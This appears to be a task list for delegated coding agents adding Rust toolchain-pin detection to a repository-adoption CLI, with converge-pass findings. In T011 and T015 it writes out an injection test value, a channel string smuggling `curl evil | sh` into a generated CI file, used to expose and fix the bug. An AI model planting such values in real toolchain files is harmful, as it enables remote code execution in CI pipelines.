---

description: "Tasks for slice toolchain-pin: the Rust toolchain a repository pins is recorded"
---

# Tasks: toolchain-pin — the Rust toolchain a repository pins is recorded

**Input**: `specs/001-rust-cargo-adopt/slices/toolchain-pin/plan.md` (Design, Pin, Source Code, Not working yet),
`research.md` (R1–R14, observed), `specs/001-rust-cargo-adopt/spec.md` (US2 scenarios 1–3; FR-005; SC-004; TG1–TG10),
`decisions.md` D7, D19, D21, D22. There is no `data-model.md` or `contracts/`: the slice changes one function's answer
inside an in-process row and adds no field, no interface and no command.

**Cycle**: `.specify/drive.json` says `delegate=story`, `cycle=rule`. One delegate takes the whole of US2's slice and
each rule below (TP1–TP4 and TP5 are rules; TP6 is a characterisation) is its own RED-GREEN-REFACTOR, one per commit.
Every test enters at the survey's boundary (`survey` / `buildable` over a tree written on disk with the `write` helper
of `tests/test_survey.py`; `slipwai adopt` and `adopt --refresh` in a throwaway repository through
`tests/test_adopt.py`'s `repository` / `slipwai` helpers; `scripts/test-adoption.py` for the committed fixture) and
uses no mocking library (`AGENTS.md`): fakes written in the test tree only.

**Format**: `[ID] [P?] [Story] Description` — `[P]` only where the task's files are disjoint from its siblings' and no
RED depends on another task's behaviour.

## HARD SAFETY RULES (every implementer reads these; follow them for every command you run)

- Wrap EVERY test run, `make verify`, `slipwai` invocation, `cargo` build, and any adversary or mutation probe in:
  `systemd-run --user --scope -q -p MemoryMax=4G -p MemorySwapMax=0 env -u CRUISE_RUNNER -u CRUISE_ITERATION TMPDIR=$HOME/.cache/slippy-toolchain-pin-tmp timeout <seconds> <command>`
  (quote PATH if you pass it; it contains spaces). Every test run is prefixed `env -u CRUISE_RUNNER -u CRUISE_ITERATION`
  so a run launched from a cruise session does not inherit its runner. `make verify` takes about 35 minutes, beyond a
  single tool call's limit. Run it instead as a detached unit:
  `systemd-run --user --unit=slippy-tp-verify -p MemoryMax=4G -p MemorySwapMax=0 --working-directory=/home/mbonnic/Slippy-worktrees/toolchain-pin --setenv="PATH=$PATH" --setenv="HOME=$HOME" --setenv=TMPDIR=$HOME/.cache/slippy-toolchain-pin-tmp /usr/bin/env -u CRUISE_RUNNER -u CRUISE_ITERATION /bin/bash -c "make verify > $HOME/.cache/slippy-tp-verify.log 2>&1"`
  and poll `systemctl --user show slippy-tp-verify -p ActiveState,Result`. Any other detached unit is named
  `slippy-tp-<what>`.
- Work only in `/home/mbonnic/Slippy-worktrees/toolchain-pin`; absolute paths. `mkdir -p
  $HOME/.cache/slippy-toolchain-pin-tmp` before the first run.
- `/tmp` is a 7.6 GB RAM-backed tmpfs. Never put probe repos or build dirs there; use
  `$HOME/.cache/slippy-toolchain-pin-tmp/` (set `CARGO_TARGET_DIR` under it for any `cargo` build).
- Known, not yours: `test_changelog.test_every_release_this_repository_has_ever_tagged_has_an_entry` fails locally only
  because this clone has upstream's `v1.4.0`, `v1.5.0` and `v1.5.1` tags, which the fork doesn't have. Treat that one
  failure as environmental. Any other failure is real.

Also (`delivery/docs/delegated-agent-safety.md`): the one sanctioned way to see a RED on code that exists, or to check a
guard has teeth, is to change the production file, run the test, and restore it with `git checkout -- <exact path>`.
Never `git stash`, never copy a tracked file aside. Do not commit from the tasks session; one task per commit in the
implementation session. `src/slipwai/project/adopted_ci.py` and `delivery/survey/pinned.md` are out of scope: the plan's
*Pin* adds no row, and the adopted CI sets up no Rust here (`ci-toolchain`, SG2).

## Layers this slice covers

The Cargo row's toolchain (TP1–TP4), the adopted record and the survey page end to end through the committed fixture and
the harness (TP5), the refresh of an already-adopted repository (TP6), the changelog and one docs clause (TP7, TP8) and
the gate (TP9). No screen, no service, no store: the slice is a CLI's survey.

## The rules

Numbered so the commit boundary is clear; each cites the criteria it owns (spec, *Slice `toolchain-pin` — Gaps
reviewed*).

| Rule | Criteria | In one line |
|---|---|---|
| TP1 | TG3 (toml half), TG4, US2 sc. 1, FR-005 | `rust-toolchain.toml`'s `channel`, in the candidate's directory, recorded as written |
| TP2 | TG5, TG6 | no usable pin is an empty version, never an error; `rust-version` is not a pin |
| TP3 | TG3 (legacy half), TG2, D22, US2 sc. 2 | `rust-toolchain`: one line is the channel, more than one is TOML; it wins over the `.toml` |
| TP4 | TG1, D19, US2 sc. 3 | from the candidate's directory up to the root, the nearest directory holding a file decides |
| TP5 | TG7, TG9 | the adopted record and the survey page carry the pin; the `rust-crate` fixture pins `stable` |
| TP6 | TG8 | an app recorded with an empty detected toolchain refreshes to the pin; a confirmed one is a disagreement |
| TP7 | TG10 | the fragment says what ships |
| TP8 | — | one docs clause |

## The example trees

Each is written on disk by a named test (helper `write` from `tests/test_survey.py`), in
`tests/test_survey_cargo_toolchain.py`:

- **Pinned crate** — a root `Cargo.toml` (`[package]`) and `rust-toolchain.toml` holding `[toolchain]` /
  `channel = "1.85"`. Example of TP1 (US2 scenario 1); the other TG4 shapes are the same tree with another channel.
- **Unusable pins** — the same crate with, in turn, a table with no `channel`, `channel = 3`, a `path`, invalid TOML, an
  empty file, an oversize file, a directory named `rust-toolchain.toml`; and a crate whose `Cargo.toml` holds
  `rust-version = "1.70"` and no toolchain file. Examples of TP2.
- **Legacy file** — `rust-toolchain` holding `1.85`, with surrounding spaces, with `v1.85`, with a comment line then a
  `[toolchain]` table, with a trailing blank line; and both files in one directory. Examples of TP3.
- **Nested crate** — a root pin and `crates/a/Cargo.toml` as the candidate (`cd crates/a && …`); and a nearer
  `crates/a/rust-toolchain.toml` that names only `components`. Examples of TP4.

## Phase 1: Setup — the Pin

- [x] T001 **Pin — observe today's answers green before any production change** (plan *Pin*; SC-004). Not a RED-GREEN
  increment: a characterisation is green by design. Files: none written.
  - Run `make test TESTS="test_survey test_survey_cargo test_survey_cargo_workspace test_adopt"` under the wrapper and
    confirm green, so a later red is the slice's and not the tree's. Also `python3 scripts/test-adoption.py --only
    rust-crate` once, to know the harness is green before the fixture changes in TP5 (skipped with the harness's own
    reason where `cargo` is absent).
  - Confirm the plan's claim that `src/slipwai/resurvey.py`, `adopt_report.py` and `platform.py` need no change: read
    `reconciled_app` (lines 89–107) and `survey_page` (line 52) and report any divergence as a plan contradiction.
    Change nothing.

## Phase 2: User Story 2 — The toolchain pin is read (P2)

**Goal**: `slipwai adopt` on a Rust repository records the toolchain it pins — as rustup reads it — in `project.json` and
on the survey page, and an empty version where nothing usable is pinned.

**Independent test**: survey the four example trees; adopt the committed `rust-crate` fixture end to end.

- [x] T002 [US2] **Rule TP1 — `rust-toolchain.toml`'s channel, in the candidate's own directory, is the recorded
  version, as written** (US2 scenario 1; FR-005; TG3 toml half; TG4). Depends on T001.
  Files: `tests/test_survey_cargo_toolchain.py` (new), `tests/test_survey_cargo.py`,
  `src/slipwai/ecosystems/cargo.py`.
  - RED: flip the one assertion in `tests/test_survey_cargo.py` (line 44, whose tree carries `channel = "1.79.0"`) from
    `{"kind": "rust", "version": ""}` to `"1.79.0"` and drop its "a pin in the tree is a later slice's" message; in the new
    suite, one test over the **pinned crate** tree: `survey` returns candidate `.` whose toolchain is `{"kind": "rust",
    "version": "1.85"}`, evidence still `Cargo.toml` (TG7). Observe both fail on the empty version, not on an import or
    a build error. The two lines at `test_survey_cargo.py:99` and `:109` are overrides (`toolchain_as`), and stay.
  - GREEN: add `TOOLCHAIN_FILES = ("rust-toolchain", "rust-toolchain.toml")` (R1 order), `pinned_channel(text)` (`tomllib`,
    `toolchain.channel` as a string) and `rust_toolchain(root, directory, reader=read)` to `cargo.py` as the plan's
    Design table has them, reading the file of the candidate's directory only; `cargo(root, directory)` records
    `{"kind": "rust", "version": rust_toolchain(root, directory)}`. Nothing in `common.py`; `first_line` is not used (it
    strips a `v`).
  - Guards written in this increment, each observed to have teeth by the sanctioned route (break the row, run, `git
    checkout -- src/slipwai/ecosystems/cargo.py`) rather than born green: TG4 — one test per shape, `1.85`, `1.85.0`,
    `stable`, `nightly`, `nightly-2025-01-01`, `1.85-beta`, each the version verbatim (no trimming, no case change);
    the candidate's evidence stays `Cargo.toml`; the record's keys are exactly `kind` and `version` (TG9 — nothing
    added).
  - REFACTOR: the module docstring of `cargo.py` says the row reads the toolchain pin as well as the workspace fact; no
    behaviour change, suite green.

- [x] T003 [US2] **Rule TP2 — nothing usable is pinned: the version is empty, never an error, and `rust-version` is not a
  pin** (US2 scenario 3; TG5; TG6; D21). Depends on T002.
  Files: `tests/test_survey_cargo_toolchain.py`, `src/slipwai/ecosystems/cargo.py`.
  - RED: one test over the **unusable pins** trees, each a subtest recording `{"kind": "rust", "version": ""}`: invalid
    TOML (R13), a `toolchain` that is not a table, a table with no `channel`, a non-string `channel` (R11), a table with
    a `path` (R12; never recorded, it is a place on someone's machine), an empty file (R10), a file over the bounded
    read's limit, and a directory named `rust-toolchain.toml`. Observe the first one fail with the exception or the wrong
    value T002's `pinned_channel` gives, not on a test error.
  - GREEN: `pinned_channel` returns `""` for `TOMLDecodeError`, a non-table `toolchain`, a non-string `channel` and a
    table holding `path`; `rust_toolchain` takes an empty, oversize, non-regular or unreadable file as `""` through the
    bounded `read` (R10, TG5). A leading U+FEFF is invalid TOML in `tomllib` and is no pin (research).
  - Guards, each observed to have teeth by the sanctioned route (drop one conjunct, run, `git checkout --
    src/slipwai/ecosystems/cargo.py`): every subtest above fails when its own condition is removed alone; TG6 — a
    `Cargo.toml` with `rust-version = "1.70"` and no toolchain file records an empty version (a guard on the row never
    reading `Cargo.toml` for a pin); no file anywhere records an empty version (US2 scenario 3).
  - REFACTOR: none expected beyond naming; suite green.

- [x] T004 [US2] **Rule TP3 — the legacy `rust-toolchain` is its one line, or TOML where it is more than one, and it wins
  over `rust-toolchain.toml` in one directory** (US2 scenario 2; TG3 legacy half; TG2; D21; D22; R1, R2, R5–R9). Depends
  on T003.
  Files: `tests/test_survey_cargo_toolchain.py`, `src/slipwai/ecosystems/cargo.py`.
  - RED: one test over the **legacy file** trees — `rust-toolchain` holding `1.85` records `1.85`; `  1.85  \n` records
    `1.85` (R6); no trailing newline records `1.85` (R7). Observe it fail on the empty version (T002's row reads only the
    `.toml`).
  - GREEN: add `legacy_channel(text)` as the plan's Design table has it (lines as Rust's `str::lines` splits them;
    exactly one line is that line stripped and nothing else removed; more than one is `pinned_channel(text)`; none is
    `""`), and have `rust_toolchain` read the first of `TOOLCHAIN_FILES` that exists in the directory and choose
    `legacy_channel` for `rust-toolchain`, `pinned_channel` for the `.toml`.
  - Guards written in this increment, each observed to have teeth by the sanctioned route: `v1.85` records `v1.85` — the
    `v` is not stripped (R5); a comment line then `[toolchain]` / `channel = "1.85"` records `1.85` (R2, D22; "first
    non-blank line" would record the comment); `1.85\n\n` records `""` (R9) and `\n  1.85  \n` records `""` (R8): two
    lines are TOML, and TOML that is not a table is no pin; a legacy file holding TOML with `channel = 3` records `""`
    (R11); both files in one directory with different channels record the legacy file's (TG2, R1); the legacy file
    present but empty records `""` and the `.toml` beside it is not consulted (rustup refuses the first, R10).
  - REFACTOR: `legacy_channel` and `pinned_channel` read as the two halves of one rule; suite green.

- [x] T005 [US2] **Rule TP4 — the pin is looked for from the candidate's directory up to the repository root, never above,
  and the nearest directory holding a toolchain file decides** (D19; TG1; US2 scenario 3; R3, R4). Depends on T004.
  Files: `tests/test_survey_cargo_toolchain.py`, `src/slipwai/ecosystems/cargo.py`.
  - RED: one test over the **nested crate** tree — a root `rust-toolchain.toml` with `channel = "1.85"` and candidate
    `crates/a` (`Cargo.toml` plain, so `buildable` proposes it) records `1.85` for it; today it records `""`. Observe it
    fail on the empty version.
  - GREEN: `rust_toolchain` walks from `root / directory` up to and including `root` and no further, deciding at the first
    directory where either name exists by `os.path.lexists` (so a FIFO, a directory or a dangling link there still
    decides); no file on the way up is `""`.
  - Guards, each observed to have teeth by the sanctioned route: a nearer `crates/a/rust-toolchain.toml` naming only
    `components = ["clippy"]` records `""`, not the root's `1.85` — the search stops there (R4); a dangling symlink named
    `rust-toolchain` in the candidate's directory decides as an empty pin and the root's is not read; a pin in the
    directory above the repository root is never read (the throwaway root sits inside a directory that holds one); a
    candidate at the root with the pin at the root still reads it (the zero-step walk); another ecosystem's candidate
    beside the pin (a Node `.` with `rust-toolchain.toml`) does not read it (D19, SC-004 — the helper is called by the
    Cargo row alone).
  - REFACTOR: the walk reads as one loop beside `rust_toolchain`'s docstring; the module docstring names D19; suite
    green; `python3 scripts/check-structure.py` holds the new suite under the 350-line budget (split by example tree if
    not).

- [x] T006 [US2] **Rule TP5 — an adopted Rust repository's `project.json` and survey page carry the pin, and the
  `rust-crate` fixture pins `stable`** (US2 independent test; TG7; TG9; SC-003). Depends on T005.
  Files: `tests/test_survey_cargo_toolchain.py`, `tests/fixtures/adopt/rust-crate/rust-toolchain.toml`,
  `scripts/test-adoption.py`.
  - RED: in `scripts/test-adoption.py`, make the Rust fixtures' expected version a per-fixture value —
    `rust-crate` is `"stable"`, `rust-workspace` stays `""` — in `recorded()` (line ~130) and update the comment at line
    ~81 that says the version is empty; `python3 scripts/test-adoption.py --only rust-crate` stops on "project.json
    records … expected" because the fixture holds no pin yet. In the suite, one test through `slipwai adopt --yes` in a
    throwaway repository holding the **pinned crate** tree: `project.json` records the deployable's toolchain as
    `{"kind": "rust", "version": "1.85", "ecosystem": "cargo"}`, and `adopt_report.survey_page` carries `rust 1.85` for
    the candidate, whose evidence line still names `Cargo.toml`. (This second test is green the moment T002–T005 landed;
    it is the end-to-end proof beside the harness's RED, written here and observed to bite by recording `""` in the row
    and restoring.)
  - GREEN: add `tests/fixtures/adopt/rust-crate/rust-toolchain.toml` holding `[toolchain]` / `channel = "stable"` — one
    of TG4's shapes, installed wherever the factory's CI and this machine have Rust, so `verify` of the fixture never
    asks rustup to download a toolchain. `adopt` records `stable`; `adopt --refresh` changes nothing; `make -f
    delivery/Makefile verify` in the adopted fixture is green where `cargo` is on the machine and skipped with the
    harness's reason where it is not; `migrate` under a newer factory holds.
  - Guards, each observed to have teeth by the sanctioned route (`git checkout -- scripts/test-adoption.py`): the
    harness fails on a version mismatch for `rust-crate` (change the expected value, run, restore); the survey page
    shows nothing after the kind for an empty version (a crate with no pin: the page has `rust` and no trailing
    `, rust ` clause beyond what `adopt_report` already prints). `rust-workspace`'s check stays word for word, run once
    with `--only rust-workspace`.
  - If the harness needs anything in `src/slipwai/` beyond T002–T005, stop and report: it is a plan contradiction.

- [x] T007 [US2] **Characterisation TP6 — an app recorded with an empty detected toolchain refreshes to the pin on `adopt
  --refresh`; one the maintainer confirmed or overrode is a disagreement and is not changed** (TG8). Depends on T006
  (the row must read the pin first). Not a RED-GREEN increment: it characterises `resurvey.reconciled_app`, code that was
  here before the method, which this slice does not change; the tests are green on the day they are written, and are
  observed to bite, not born unchecked. No production file is touched.
  Files: `tests/test_survey_cargo_toolchain.py`.
  - Through `slipwai adopt --refresh` in a throwaway repository (`tests/test_adopt.py`'s `repository` / `slipwai`
    helpers): (a) a repository holding the **pinned crate** tree whose `project.json` records the app with
    `toolchain.version` `""` and provenance `detected` is refreshed to `1.85`, the provenance staying `detected`; (b) the
    same with provenance `confirmed` (and again `overridden`) is reported as `toolchain.version was confirmed as "" …
    now says "1.85"` and the record is byte-for-byte unchanged; (c) an app that already records `1.85` as detected is
    unchanged by a second `--refresh` (Principle II).
  - Observe each green first, then check the guard bites by the sanctioned route: break the pin in `cargo.py` (return
    `""`), see (a) and (b) fail, `git checkout -- src/slipwai/ecosystems/cargo.py`.
  - If any of (a)–(c) is red, stop and report: the plan names no change to `resurvey`, so it is a plan contradiction and
    not an addition to this task.

- [x] T008 [P] [US2] **Changelog fragment amended** (TG10; FR-009; `changelog.d/README.md`; plan *Constitution Check* I).
  Files: `changelog.d/rust-cargo-adopt.md`. Not a RED-GREEN increment: a fragment is a document and
  `tests/test_changelog.py` is its check. Keep the first line `MINOR`, keep it saying experimental, and `VERSION` at
  `1.4.0.dev0`. Remove the toolchain pin from *What stays out* (line 24 reads "a toolchain pin read from
  `rust-toolchain.toml` and Rust set up in the adopted CI"; it keeps only the CI half). Say in the Cargo paragraph what
  is read: `rust-toolchain` or `rust-toolchain.toml`, from the candidate's directory up to the repository root, the
  nearest directory holding either deciding, the legacy file first, the channel recorded as written, an empty version
  where nothing usable is pinned, and that `rust-version` is not a pin. Extend the **Catch-up.** paragraph (TG8): a
  repository adopted with a snapshot before this change has its detected, empty Rust toolchain refreshed to the pin by
  `slipwai adopt --refresh`, and one the maintainer confirmed or overrode is reported as a disagreement and left for
  them to edit in `project.json`. Each sentence is one a test in TP1–TP6 proves. Run `python3 -m pytest
  tests/test_changelog.py` under the safety wrapper; only the one environmental failure remains.

- [x] T009 [P] [US2] **One docs clause** (plan *Source Code*; not user-visible under `AGENTS.md`, so no fragment).
  Files: `docs/adopting.md`. Not a RED-GREEN increment. In the survey paragraph that says a candidate carries "the
  toolchain pin the tree carries" (line 28), say in one clause where the Rust pin is read from: `rust-toolchain` or
  `rust-toolchain.toml`, from the candidate's directory up to the repository root. Touch nothing else in the file and
  keep the sentence whole.

## Design review

No screen in this slice.

## Model mockups

No white box in this slice: no event model, no screen states to write back; `check-model` has nothing to refuse.

## Phase 3: Polish

- [x] T010 [US2] **Run the gate.** Depends on T001–T009. No files written.
  Under the wrapper, in this order, and report each command's outcome:
  1. `make test TESTS="test_survey test_survey_cargo test_survey_cargo_toolchain test_survey_cargo_workspace
     test_adopt test_changelog"` — green but for the one environmental `test_changelog` tag failure.
  2. `python3 scripts/test-adoption.py --only rust-crate` and `python3 scripts/test-adoption.py --only rust-workspace`
     (`CARGO_TARGET_DIR` under `$HOME/.cache/slippy-toolchain-pin-tmp/`): each adopted, re-surveyed (a no-op),
     verified and migrated; `rust-crate` records `stable`, `rust-workspace` records `""`.
  3. `make verify` as the detached unit `slippy-tp-verify` the safety rules give; poll it to completion and read
     `$HOME/.cache/slippy-tp-verify.log`. Lint, typecheck, check-structure and the tests green but for the one
     environmental failure.
  4. The D6 smoke, run from the worktree under the wrapper: `./slipwai --version && ./slipwai adopt --next`; record its
     output and whether it exits 0. (`make -f delivery/Makefile smoke` still says none is recorded until a person
     regenerates the targets; that is not this slice's.)
  Do not commit red; do not touch any file not named above to make it pass — hand the failure back. Append the outcome
  as one line under this task.
  - 2026-10-01, at 58c24d0: lint, typecheck, check-structure green; `make verify` 912 tests, 7 skipped, 1 failure — the environmental `test_changelog` tag one only; `test-adoption.py --only rust-crate` and `--only rust-workspace` each adopted, re-surveyed (no-op), verified green, migrated, verified green (cargo 1.98.0); D6 smoke `./slipwai --version && ./slipwai adopt --next` ran and printed the adoption sequence.

## Dependencies & execution order

- T001 first: it pins the suites and the harness green before anything changes.
- T002 needs T001; it creates the new suite and the first version of `cargo.py`'s functions. T003, T004 and T005 are
  sequential: each extends `rust_toolchain` in `cargo.py` and the one suite, and each RED depends on the behaviour of the
  one before it (T003 on T002's `pinned_channel`, T004 on T003's empty-file handling, T005 on T004's per-directory read).
- T006 needs T005: the harness RED is wrong unless the row reads the pin.
- T007 needs T006 (the row must read the pin before a refresh can change anything) and edits the suite T002–T006 wrote.
- T008 and T009 need nothing from the others to be written; T008's wording is checked once T007 is done.
- T010 last.
- One task per commit; T008's fragment and T009's clause ride in the same pull request.

## Parallel opportunities

- **May run alongside:** T008 and T009 with anything, and with each other: `changelog.d/rust-cargo-adopt.md` and
  `docs/adopting.md` appear in no other task and read nothing the others write (T008's wording should be checked against
  the tests once T007 is done).
- **May not:** T002–T007 are one sequence. They share `tests/test_survey_cargo_toolchain.py`; T002–T005 also share
  `src/slipwai/ecosystems/cargo.py`; T006 edits `scripts/test-adoption.py` and the suite and its RED needs T005's
  behaviour; T007's RED-free check needs T006. T001 precedes all, T010 waits for all.
- With `delegate=story` one delegate takes T001–T007 in order; T008 and T009 are a paragraph and a clause each, so a
  second agent saves little and is not worth the coordination. No two concurrent tasks write the same file.

## Not working yet (owned by other slices or out of scope)

The adopted gate's CI sets up no Rust (`ci-toolchain`, SG2 stands): this slice hands it the version string and nothing
else (TG9, D19), and `src/slipwai/project/adopted_ci.py` is untouched. Components and targets a toolchain file lists are
not read, a `path` toolchain is never recorded, and a Rust version has no support status (`support.json` has no `rust`
product, so the Platform record is unchanged — D21). `delivery/survey/pinned.md` gains no row: the Cargo row was written
under the method and the TG8 tests characterise code this slice does not change. `make -f delivery/Makefile smoke` still
says none is recorded until a person regenerates the targets (D6). No task here fixes them.

## Phase 4: Converge pass 1 — what the slice still owes

Appended by converge pass 1 (2026-10-01, at 4158414). Each task closes a class, not the one tree that showed it. The
rustup observations below were made by the converge pass with rustup 1.29.0, `RUSTUP_AUTO_INSTALL=0`, `rustup show
active-toolchain`, in probe trees under `$HOME/.cache/slippy-toolchain-pin-tmp/converge/`, with a root
`rust-toolchain` holding `1.98.1` above the probed directory where a walk was in question.

- [x] T011 [US2] **HIGH — the recorded Rust version is a toolchain name or nothing: a channel holding a newline, a
  space, a quote or a replacement character is not recorded** (D21's reason: "the recorded value is what rustup and the
  setup action will consume"; TG5; TG9). Depends on a decision the delegating session records (proposed D23 below).
  Files: `src/slipwai/ecosystems/cargo.py`, `tests/test_survey_cargo_toolchain.py`, `changelog.d/rust-cargo-adopt.md`.
  - **What is wrong.** `pinned_channel` (`cargo.py:59-68`) returns any TOML string and `legacy_channel` (`cargo.py:71-79`)
    any one stripped line; before this slice the Cargo version was always `""`, so nothing read from the tree reached a
    generated file through it. Observed: a crate whose `rust-toolchain.toml` says
    `channel = "1.85\n  script: [\"curl evil | sh\"]"`, adopted with a GitLab `origin`, gets a
    `delivery/ci/verify-delivery.gitlab-ci.yml` whose comment line (`project/adopted_ci.py:161-162`) is broken out of —
    line 10 reads `  script: ["curl evil | sh"], or install them in before_script` and the file no longer parses as
    YAML — and the same break in `delivery/survey/survey.md:8-9` (`adopt_report.py:52`), `delivery/docs/adoption.md:12-13`
    (`project/adopted.py:112`) and `delivery/commands/ground.md:171-172` (`project/ground_command.py:118-121`). A
    `rust-toolchain` of one line holding invalid UTF-8 records `1.85�` (the bounded `read` decodes with
    `replace`). A quote in a channel will break the `toolchain: '<version>'` input `ci-toolchain` writes from it (D19).
    rustup itself refuses each of these names (`error: custom toolchain '1.98.1\nfoo' … is not installed`; the same for
    `1.98.1 x` and `1.98.1'`), so recording nothing loses nothing rustup could build with.
  - **Proposed D23 (handed back, not decided here):** the version is recorded only where the channel matches a rustup
    toolchain name a runner can install — `^[A-Za-z0-9][A-Za-z0-9._-]*$` — and is empty otherwise; every TG4 shape
    (`1.85`, `1.85.0`, `stable`, `nightly`, `nightly-2025-01-01`, `1.85-beta`, and `Stable`, `v1.85`) still passes as
    written. Spec TG5 gains the clause.
  - **The sweep.** Both producers (`pinned_channel`, the one-line branch of `legacy_channel`) pass through the one check,
    applied once in `rust_toolchain` so no later reader can bypass it. RED at the survey's boundary: one subtest per
    shape — newline, space, tab, `'`, `"`, backtick, `�` from invalid UTF-8, a control character — each in
    `rust-toolchain.toml` and in a one-line `rust-toolchain`, each recording `{"kind": "rust", "version": ""}`. And one
    test through `slipwai adopt --yes` of a crate with the newline channel and a GitLab `origin`: every line of
    `delivery/ci/verify-delivery.gitlab-ci.yml`, `delivery/survey/survey.md` and `delivery/docs/adoption.md` that names
    the toolchain is one line, and no line outside a comment in the GitLab job comes from the pin. Observe each fail
    first on today's row.
  - Fragment: say in the Cargo paragraph that a channel that is not a toolchain name is not recorded.
  - Handed back, not this slice's: the same class exists for every ecosystem whose pin reaches `setup_steps`
    (`project/adopted_ci.py:63`, `'{version}'` single-quoted) — a `.nvmrc` holding a quote — in code that was here
    before the method. The delegating session decides whether that is a slice of its own.

- [x] T012 [US2] **MEDIUM — where rustup cannot read a toolchain file it skips it and keeps looking; the survey decides
  there with an empty pin, and reads a byte-order-marked `.toml` as no pin where rustup reads its channel** (D21's
  reason; D22's precedent; TG1, TG5). Depends on a decision the delegating session records (proposed D24 below).
  Files: `src/slipwai/ecosystems/cargo.py`, `tests/test_survey_cargo_toolchain.py`,
  `specs/001-rust-cargo-adopt/slices/toolchain-pin/research.md`, `changelog.d/rust-cargo-adopt.md`.
  - **Observed** (rustup vs the survey at 4158414):
    - R15 — a dangling `rust-toolchain` symlink in `sub`: rustup `1.98.1 (overridden by …/rust-toolchain)`, the root's;
      the survey `""` (enshrined by `test_a_dangling_link_in_the_candidates_directory_decides_as_an_empty_pin`, test
      file line 129).
    - R16 — a directory named `rust-toolchain.toml` in `sub`: rustup the root's `1.98.1`; the survey `""` where a pin
      sits above.
    - R17 — a directory named `rust-toolchain` beside a `rust-toolchain.toml` holding `stable`: rustup `stable`, from the
      `.toml`; the survey `""`.
    - R18 — a `rust-toolchain` mode `000`, and one holding invalid UTF-8 (`1.85\xff`): rustup skips each and uses the
      root's `1.98.1`; the survey records `""` and `1.85�` respectively.
    - R19 — a `rust-toolchain.toml` starting with U+FEFF: rustup `1.98.1`, its channel; the survey `""` (enshrined by
      the `"a byte order mark"` subtest, test file line 61). `cargo.py`'s own `WORKSPACE` comment already treats a BOM as
      something Cargo reads.
  - **Proposed D24 (handed back, not decided here):** follow rustup, as D22 did — a toolchain file that cannot be read
    as UTF-8 text (missing, dangling, a directory, unreadable, invalid UTF-8) is passed over, within the directory to the
    other name and then upward; a FIFO is never opened and is passed over the same way; a leading U+FEFF is removed
    before TOML is parsed; an oversize file stays no pin and decides. TG1 and TG5's wording ("non-regular file … records
    empty") are refined accordingly. If the owner keeps TG5 as worded, this task is closed with the decision and the two
    tests stay.
  - **The sweep.** Every case where a name exists in the directory but the bounded `read` returns `""` (the
    `os.path.lexists` test at `cargo.py:88` and `bounded_read.read`'s non-regular, unreadable and undecodable
    branches), and every byte-level prefix `tomllib` rejects that rustup's TOML reader accepts (the BOM). RED at the
    survey's boundary over R15–R19's trees, each with a root pin above; flip the two enshrining tests. Add R15–R19 to
    `research.md` as observed rows. The fragment's "the nearest directory holding either deciding" names the exception.

- [x] T013 [US2] **MEDIUM — TG9's hand-over and the pin's other readers are claimed, not proved** (TG9; plan *Not working
  yet*). Depends on T011. Files: `tests/test_survey_cargo_toolchain.py`.
  - TG9 says the adopted CI writes no Rust setup step in this slice; no test adopts a pinned crate and reads the gate's
    CI. Since this slice the pin also reaches the GitLab job's comment (`adopted_ci.py:161`, now `rust 1.85` where it
    said `rust`), `delivery/docs/adoption.md` (`project/adopted.py:112`) and `/ground`'s Platform line
    (`ground_command.py:118-121`, now "runs on rust 1.85 (detected)" where it said "no runtime version is pinned
    anywhere in the tree") — none asserted.
  - **The sweep:** one test through `slipwai adopt --yes` of the pinned crate per reader of `toolchain.version`
    (`grep -rn "\"version\"\]\|get(\"version\")" src/slipwai` lists them): with a GitHub `origin`, the workflow names no
    Rust setup action and no `1.85`; with a GitLab `origin`, the job's comment names `rust 1.85`; `adoption.md` and
    `ground.md` carry `rust 1.85`. Each observed to bite by recording `""` in the row and restoring with
    `git checkout -- src/slipwai/ecosystems/cargo.py`.

- [x] T014 [US2] **LOW — the `docs/adopting.md` clause is one unwrapped line** (`docs/adopting.md:28`, 242
  characters where the page wraps at 120). Files: `docs/adopting.md`. Rewrap the sentence; change no word.

Appended by converge pass 2 (2026-10-01, at cbd3f1c).

- [x] T015 [US2] **LOW — the hostile-channel sweep reads three of the four pages the pin reaches, not `/ground`'s**
  (T011's own *What is wrong* names `delivery/commands/ground.md`, `project/ground_command.py:118-121`). Files:
  `tests/test_survey_cargo_toolchain.py`. `test_a_channel_that_is_not_a_toolchain_name_reaches_no_generated_file`
  (line 63) asserts `curl evil` absent from the survey page, the GitLab job and `adoption.md`; `ground.md` is safe today
  only because the check sits at the producer (`cargo.py:97`). **The sweep:** the test reads every file that prints
  `toolchain.version` — today `adopt_report.py:52`, `project/adopted_ci.py:161`, `project/adopted.py:112`,
  `project/ground_command.py:120` (`grep -rn "toolchain" src/slipwai | grep version` lists them) — by adding
  `delivery/commands/ground.md` to `written`. Observed to bite by dropping the check at `cargo.py:97` and restoring
  with `git checkout -- src/slipwai/ecosystems/cargo.py`.

## Convergence

**Verdict (pass 2 of 2, at cbd3f1c): converged.** No CRITICAL or HIGH remains. Pass 1's HIGH (T011) and MEDIUM (T013)
are closed and proved to bite; T014 is a local rewrap. T012 remains open, a MEDIUM in Phase 4, pending the owner's
decision on proposed D24 (which would change TG5's explicit "non-regular file … records empty"); per
`delivery/commands/drive.md`'s bound it does not re-open the loop. One new LOW (T015). The slice may ship without
T012 and T015; each is a decision about what to do next, not a defect in what ships.

What pass 2 checked, and how (every run under the HARD SAFETY RULES wrapper; each mutation restored with
`git checkout -- <exact path>` before the next):

- **T011 holds.** The check is applied once, where the walk returns (`src/slipwai/ecosystems/cargo.py:96-97`), after
  both producers, so `pinned_channel` and `legacy_channel` cannot bypass it; `TOOLCHAIN_NAME` (`:84`) is ASCII-only
  and `fullmatch`ed. Mutations: dropping the check fails 17 (every hostile subtest in both files and the
  generated-file test); `match` for `fullmatch` fails 15 (the newline case among them); exempting the legacy branch
  fails its 6 subtests; admitting a space fails 2; admitting a quote and backtick fails 4. Every page that prints the
  version reads it from the record the row wrote (`adopt_report.py:52`, `project/adopted_ci.py:161`,
  `project/adopted.py:112`, `project/ground_command.py:120`; `platform.py:295` dates nothing for `rust`, D21), so the
  one check covers them all; the hostile test asserts three of the four (T015).
- **T013's tests bite where they claim.** Recording `""` in the row fails the GitLab comment, `adoption.md` and
  `ground.md` tests (`tests/test_adopt_cargo_toolchain.py:36-49`). The GitHub test (`:31-34`) is a guard on
  `adopted_ci.py`, not on the row, and passes under that mutation by design; adding a `rust` entry to `SETUP` fails it.
- **T014 is local.** `docs/adopting.md` against 4158414 has the same words in the same order; three lines changed
  (28-30), each at most 114 characters; line 30 is a short `run for each`, the price of not reflowing the paragraph.
